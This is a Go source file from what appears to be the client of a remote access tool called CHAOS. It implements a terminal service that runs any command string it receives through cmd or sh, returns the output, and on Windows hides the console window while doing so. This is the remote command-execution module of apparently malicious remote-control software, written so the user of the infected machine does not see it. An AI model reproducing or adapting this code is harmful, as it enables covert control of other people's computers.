package terminal

import (
	"context"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"os/exec"
	"runtime"
	"time"
)

type Service struct{}

func NewService() services.Terminal {
	return &Service{}
}

func (t Service) Run(cmd string, timeout time.Duration) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout*time.Second)
	defer cancel()

	var cmdExec *exec.Cmd
	switch runtime.GOOS {
	case `windows`:
		cmdExec = exec.CommandContext(ctx, "cmd", "/C", cmd)
		cmdExec.SysProcAttr = GetHideWindowParam()
	case `linux`:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	case `darwin`:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	default:
		return services.ErrUnsupportedPlatform.Error()
	}

	c, err := cmdExec.CombinedOutput()
	if err != nil {
		if ctx.Err() != nil {
			return services.ErrDeadlineExceeded.Error()
		}
		return string(c)
	}
	return string(c)
}
